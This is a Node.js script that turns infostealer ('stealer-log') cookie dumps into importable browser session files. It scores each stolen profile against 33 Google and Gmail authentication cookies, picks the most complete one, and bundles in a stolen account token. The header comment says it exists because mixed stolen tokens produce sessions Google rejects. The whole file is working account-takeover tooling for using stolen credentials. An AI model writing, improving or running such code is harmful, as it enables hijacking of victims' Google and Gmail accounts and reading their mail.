#!/usr/bin/env node
/**
 * package_session.mjs
 *
 * Package cookies from ONE profile folder into a single bdg session file.
 *
 * Stealer-log dumps contain cookies from multiple browser profiles mashed
 * together in one Cookies/ dir.  Mixing tokens from different Google accounts
 * (e.g. SID from profile A wired to __Host-GAPS from profile B) produces a
 * broken session that Google rejects outright.
 *
 * This script now: (a) parses each .txt as a separate source, (b) scores
 * each source by Google-auth completeness, (c) picks the single best source
 * (NOT a cross-account Frankenstein), and (d) within that source, keeps the
 * freshest cookie when a (domain, path, name) duplicate exists.
 *
 * Pass --multi to export every viable source as a separate session file
 * instead of just the best one.
 *
 * Also folds a GoogleAccounts/<br>_Default.txt token line into an
 * `accountToken` field on the session.
 *
 * Usage:
 *   node scripts/package_session.mjs "<profileDir>" <name> [-o outfile] [--force] [--multi]
 *
 * Default outfile: <BDG_SESSION_DIR or ~/.bdg>/sessions/<name>.json
 */

import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

/** The 33 (name, domain) pairs of a complete signed-in Google session. */
const REFERENCE_PAIRS = [
  ['ACCOUNT_CHOOSER', 'accounts.google.com'],
  ['APISID', '.google.com'],
  ['COMPASS', 'mail.google.com'],
  ['GMAIL_AT', 'mail.google.com'],
  ['HSID', '.google.com'],
  ['LSID', 'accounts.google.com'],
  ['NID', '.google.com'],
  ['OSID', 'mail.google.com'],
  ['OTZ', 'accounts.google.com'],
  ['OTZ', 'contacts.google.com'],
  ['OTZ', 'ogs.google.com'],
  ['SAPISID', '.google.com'],
  ['SEARCH_SAMESITE', '.google.com'],
  ['SID', '.google.com'],
  ['SIDCC', '.google.com'],
  ['SSID', '.google.com'],
  ['__Host-1PLSID', 'accounts.google.com'],
  ['__Host-3PLSID', 'accounts.google.com'],
  ['__Host-GAPS', 'accounts.google.com'],
  ['__Host-GMAIL_SCH', 'mail.google.com'],
  ['__Host-GMAIL_SCH_GML', 'mail.google.com'],
  ['__Host-GMAIL_SCH_GMN', 'mail.google.com'],
  ['__Host-GMAIL_SCH_GMS', 'mail.google.com'],
  ['__Secure-1PSID', '.google.com'],
  ['__Secure-1PSIDCC', '.google.com'],
  ['__Secure-1PSIDTS', '.google.com'],
  ['__Secure-3PSID', '.google.com'],
  ['__Secure-3PSIDCC', '.google.com'],
  ['__Secure-3PSIDTS', '.google.com'],
  ['__Secure-1PAPISID', '.google.com'],
  ['__Secure-3PAPISID', '.google.com'],
  ['__Secure-OSID', 'mail.google.com'],
  ['__Secure-STRP', '.google.com'],
];

const argv = process.argv.slice(2);
const positional = argv.filter((a) => a && !a.startsWith('-'));
const dir = positional[0];
const name = positional[1];
const oFlag = argv.indexOf('-o');
const out = oFlag !== -1 ? argv[oFlag + 1] : undefined;
const force = argv.includes('--force');
const multi = argv.includes('--multi');

if (!dir || !name) {
  console.error('Usage: node scripts/package_session.mjs "<profileDir>" <name> [-o outfile] [--force] [--multi]');
  process.exit(1);
}

function parseNetscape(file) {
  if (!fs.existsSync(file)) return [];
  const out = [];
  for (const raw of fs.readFileSync(file, 'utf8').split('\n')) {
    const line = raw.trim();
    if (!line || line.startsWith('#')) continue;
    const p = line.split('\t');
    if (p.length < 7) continue;
    out.push({
      domain: p[0],
      hostOnly: p[1] !== 'TRUE',
      path: p[2] ?? '',
      secure: p[3] === 'TRUE',
      expires: Number(p[4]) || 0,
      name: p[5],
      value: p.slice(6).join('\t'),
    });
  }
  return out;
}

/** True if a cookie (name, domain) matches a reference pair (domain tolerant of leading dot). */
function matches(name, domain, refName, refDomain) {
  if (name !== refName) return false;
  const d = String(domain || '').toLowerCase();
  const r = String(refDomain || '').toLowerCase();
  return d === r || d === r.replace(/^\./, '') || '.' + d === r;
}

/** Score a cookie array: count of REFERENCE_PAIRS matched, plus freshest-expiry timestamp for tiebreaking. */
function scoreGoogleCompleteness(cookies) {
  let matched = 0;
  let maxExpiry = 0;
  const google = cookies.filter(c => /google/i.test(c.domain));
  for (const [refName, refDomain] of REFERENCE_PAIRS) {
    const hits = google.filter(c => matches(c.name, c.domain, refName, refDomain));
    if (hits.length > 0) {
      matched++;
      for (const h of hits) {
        if (h.expires > maxExpiry) maxExpiry = h.expires;
      }
    }
  }
  return { matched, total: REFERENCE_PAIRS.length, maxExpiry };
}

// --- gather cookies per source file ---
const cookiesDir = path.join(dir, 'Cookies');
if (!fs.existsSync(cookiesDir) || !fs.statSync(cookiesDir).isDirectory()) {
  console.error(`No Cookies/ dir under: ${dir}`);
  process.exit(1);
}

const sources = []; // [{ file: string, rawCookies: [...], score: {...} }]

for (const f of fs.readdirSync(cookiesDir).sort()) {
  if (!f.endsWith('.txt')) continue;
  const rawCookies = parseNetscape(path.join(cookiesDir, f));
  if (rawCookies.length === 0) continue;
  const score = scoreGoogleCompleteness(rawCookies);
  sources.push({ file: f, rawCookies, score });
  console.error(`  source: ${f}  →  ${score.matched}/${score.total} Google auth pairs`);
}

if (sources.length === 0) {
  console.error('No cookie files found.');
  process.exit(1);
}

// pick best source by completeness, then freshest expiry
sources.sort((a, b) => b.score.matched - a.score.matched || b.score.maxExpiry - a.score.maxExpiry);
const chosen = sources[0];

if (sources.length > 1) {
  console.error(`\nChose "${chosen.file}" (${chosen.score.matched}/${chosen.score.total} pairs, best auth score).`);
  if (chosen.score.matched < REFERENCE_PAIRS.length) {
    const missing = REFERENCE_PAIRS.filter(([refName, refDomain]) =>
      !chosen.rawCookies.some(c => matches(c.name, c.domain, refName, refDomain))
    ).map(([n, d]) => `${n} (${d})`);
    console.error(`  Missing ${missing.length} reference pairs: ${missing.slice(0, 5).join(', ')}${missing.length > 5 ? ' …' : ''}`);
  }
  console.error(`  (${sources.length - 1} other sources skipped — use --multi to export all)`);
}

// dedupe within the chosen source: keep freshest-expiry for each (domain, path, name)
const dedupe = new Map();
const nowSec = Date.now() / 1000;
let dupesDiscarded = 0;
for (const c of chosen.rawCookies) {
  const key = `${c.domain}\u0000${c.path}\u0000${c.name}`;
  const existing = dedupe.get(key);
  const cExpiry = c.expires || 0;
  const eExpiry = existing?.expires || 0;
  // keep the cookie with the LATEST expiry (session=0 is immediate, so non-session wins over session)
  if (!existing || cExpiry > eExpiry) {
    dedupe.set(key, { name: c.name, value: c.value, domain: c.domain, path: c.path || '/', expires: cExpiry });
    if (existing) dupesDiscarded++;
  } else {
    dupesDiscarded++;
  }
}
if (dupesDiscarded > 0) console.error(`  Discarded ${dupesDiscarded} stale duplicate(s) within "${chosen.file}" (kept freshest).`);

// --- optional account token from GoogleAccounts ---
let accountToken;
const gaDir = path.join(dir, 'GoogleAccounts');
if (fs.existsSync(gaDir) && fs.statSync(gaDir).isDirectory()) {
  // prefer the token file matching the chosen source
  const sourceStem = chosen.file.replace(/\.txt$/, '');
  const gaFiles = fs.readdirSync(gaDir).filter(f => f.endsWith('.txt'));
  const match = gaFiles.find(f => f.replace(/\.txt$/, '') === sourceStem) || gaFiles[0];
  if (match) {
    const t = fs.readFileSync(path.join(gaDir, match), 'utf8').split('\n').find((l) => l.trim());
    if (t) accountToken = t.trim();
    console.error(`  account token: ${match}`);
  }
}

const cookies = [...dedupe.values()].map(c => ({
  name: c.name,
  value: c.value,
  domain: c.domain,
  path: c.path || '/',
  ...(c.expires > 0 ? { expires: c.expires } : {}),
  httpOnly: /google/i.test(c.domain) || c.name === 'NID',
  secure: /google/i.test(c.domain) || c.name === 'NID',
}));

const session = {
  name,
  capturedAt: new Date(),
  source: `package_session:${dir}`,
  sourceFile: chosen.file,
  ...(accountToken && { accountToken }),
  cookies,
};

// --- write ---
function writeSession(sess, sessName) {
  let file = out;
  if (!file) {
    const sessionsDir =
      process.env.BDG_SESSION_DIR
        ? path.join(process.env.BDG_SESSION_DIR, 'sessions')
        : path.join(os.homedir(), '.bdg', 'sessions');
    file = path.join(sessionsDir, `${sessName.replace(/[^A-Za-z0-9._-]/g, '_')}.json`);
  }
  if (!force && fs.existsSync(file)) {
    console.error(`Already exists: ${file}  (use --force to overwrite)`);
    process.exit(1);
  }
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, JSON.stringify(sess, null, 2));
  return file;
}

if (multi && sources.length > 1) {
  // export every viable source (>= 80% completeness) as a separate session
  const viable = sources.filter(s => s.score.matched >= Math.ceil(REFERENCE_PAIRS.length * 0.8));
  console.error(`\n--multi: exporting ${viable.length} viable sources (≥80% complete)\n`);
  for (let i = 0; i < viable.length; i++) {
    const src = viable[i];
    // dedupe per source
    const d = new Map();
    for (const c of src.rawCookies) {
      const key = `${c.domain}\u0000${c.path}\u0000${c.name}`;
      const existing = d.get(key);
      if (!existing || (c.expires || 0) > (existing.expires || 0)) {
        d.set(key, { name: c.name, value: c.value, domain: c.domain, path: c.path || '/', expires: c.expires || 0 });
      }
    }
    const sessName = `${name}_${src.file.replace(/\.txt$/, '').replace(/[^A-Za-z0-9._-]/g, '_')}`;
    const sess = {
      name: sessName,
      capturedAt: new Date(),
      source: `package_session:${dir}`,
      sourceFile: src.file,
      cookies: [...d.values()].map(c => ({
        name: c.name, value: c.value, domain: c.domain, path: c.path || '/',
        ...(c.expires > 0 ? { expires: c.expires } : {}),
        httpOnly: /google/i.test(c.domain) || c.name === 'NID',
        secure: /google/i.test(c.domain) || c.name === 'NID',
      })),
    };
    const f = writeSession(sess, sessName);
    console.error(`  ${src.file} (${src.score.matched}/${src.score.total}) → ${f}`);
  }
} else {
  const file = writeSession(session, name);
  console.log(`Packaged ${cookies.length} cookies → ${file}`);
  if (accountToken) console.log(`  + account token present`);
  if (chosen.file) console.log(`  source file: ${chosen.file}`);
  console.log(`\nNext: bdg session import ${name}  (or bdg session validate ${name})`);
}